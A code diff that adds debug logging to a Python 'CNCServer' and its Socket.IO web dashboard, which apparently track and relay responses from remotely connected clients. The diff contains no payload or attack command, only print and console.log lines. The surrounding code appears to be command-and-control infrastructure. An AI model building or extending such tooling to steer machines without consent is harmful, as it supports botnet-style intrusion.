@@ -99,6 +99,7 @@ class CNCServer:
                 session = ClientSession(id=cid, sock=client_sock, address=addr)
                 self.clients[cid] = session
             print(f"[cnc] New client #{cid} from {addr[0]}:{addr[1]}")
+            print(f"[cnc] DEBUG: Total clients now: {len(self.clients)}")
             self._emit_event("client_connected", {"id": cid, "address": addr})
             threading.Thread(
                 target=self._client_reader, args=(session,), daemon=True
@@ -609,6 +610,9 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script>
+        console.log('Page loaded, initializing Socket.IO...');
+    </script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #e0e0e0; }
@@ -708,19 +712,26 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
     </div>
 
     <script>
+        console.log('Page loaded, initializing Socket.IO...');
         const socket = io();
         let selectedClientId = null;
         let clients = {};
 
         socket.on('connect', () => {
+            console.log('Socket.IO connected!');
             document.getElementById('status').textContent = 'Connected';
             document.getElementById('status').className = 'status connected';
             socket.emit('get_clients');
         });
 
         socket.on('disconnect', () => {
+            console.log('Socket.IO disconnected!');
             document.getElementById('status').textContent = 'Disconnected';
             document.getElementById('status').className = 'status disconnected';
+        });
+
+        socket.on('connect_error', (error) => {
+            console.error('Socket.IO connection error:', error);
         });
 
         socket.on('server_info', (data) => {
@@ -1163,16 +1174,19 @@ def run_web(server: CNCServer, web_host: str, web_port: int) -> None:
                     'info': session.info,
                     'alive': session.alive
                 })
+        print(f"[cnc] DEBUG: emit_clients_update called, {len(clients_data)} clients")
         # Emit from background thread - Flask-SocketIO requires app context
         try:
             # Use socketio.emit() which broadcasts to all when called from background thread
             socketio.emit('clients_update', {'clients': clients_data}, namespace='/')
+            print("[cnc] DEBUG: Successfully emitted clients_update")
         except Exception as e:
             print(f"[cnc] Error emitting clients_update: {e}")
             import traceback
             traceback.print_exc()
 
     def on_event(event_type: str, data: JsonDict):
+        print(f"[cnc] DEBUG: Event received: {event_type}")
         if event_type in ('client_connected', 'client_hello', 'client_disconnected', 'client_removed', 'client_response'):
             emit_clients_update()
         if event_type == 'client_response':
